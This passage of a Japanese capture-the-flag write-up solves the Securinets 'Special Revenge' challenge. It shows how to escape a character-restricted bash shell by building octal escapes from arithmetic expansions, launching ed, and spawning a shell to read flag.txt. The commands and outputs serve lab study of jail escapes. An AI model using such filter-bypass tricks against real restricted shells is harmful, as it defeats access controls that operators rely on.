securinets{ed_for_the_win}
```

フラグが得られました。

```
securinets{ed_for_the_win}
```

### Special Revenge (1000)
> After the disappointment of last year challenge "special", I came this year with a mystery revenge.

与えられた認証情報を使って問題サーバにアクセスしてみると、入力できる文字はかなり制限されているようですが、シェルが立ち上がりました。

`1(試す文字)1` を実行して `11: command not found` というエラーが発生するかしないかを確認することで、以下の文字は使えることが分かりました。

```
1 " $ # ' ( ) ` < { } \
```

まず、`1` 以外の数値の一部は以下のようにして作ることができます。

```
$ echo $((1<<1))
2
$ echo $((1<<1<<1))
4
$ echo $((1<<1<<1<<1))
8
$ echo $((1<<1<<1<<1<<1))
16
$ echo $((1<<1<<1<<1<<1<<1))
32
$ echo $((1<<1<<1<<1<<1<<1<<1))
64
$ # $$ は PID
$ # ${#x} は x の文字数を返すので、PID が 5 桁のときに…
$ echo ${#$}
5
```

また、[ptr-yudai](https://twitter.com/ptrYudai) さんの試行で `$'\111'` を入力すると `I` が実行されることが分かっていました。

これらを利用して、`"\$'\\"1$((1<<1<<1))${#$}"\\"1$((1<<1<<1))$((1<<1<<1))"'"` (= `$'\145\144'` = `ed`) を実行すると `ed` を立ち上げることができました。

`ed` では `!cmd` を入力すると `cmd` というコマンドを実行できます。`!sh` でシェルを立ち上げて `cat flag.txt` でフラグが得られました。

```
>> "\$'\\"1$((1<<1<<1))${#$}"\\"1$((1<<1<<1))$((1<<1<<1))"'"
!sh
$ ls -la
total 28
dr-xr-xr-x  2 special special 4096 Mar 22 02:02 .
drwxr-xr-x 22 root    root    4096 Mar 23 23:03 ..
-rw-r--r--  1 special special  220 Sep  1  2015 .bash_logout
-rw-r--r--  1 special special 3771 Sep  1  2015 .bashrc
-rw-r-----  1 root    special   47 Mar 22 02:02 flag.txt
-rw-r-x---  1 root    special  752 Mar 22 01:55 mystery
-rw-r--r--  1 special special  655 May 16  2017 .profile
$ cat flag.txt
securinets{bash_never_stop_from_being_awesome}
```

```
securinets{bash_never_stop_from_being_awesome}
```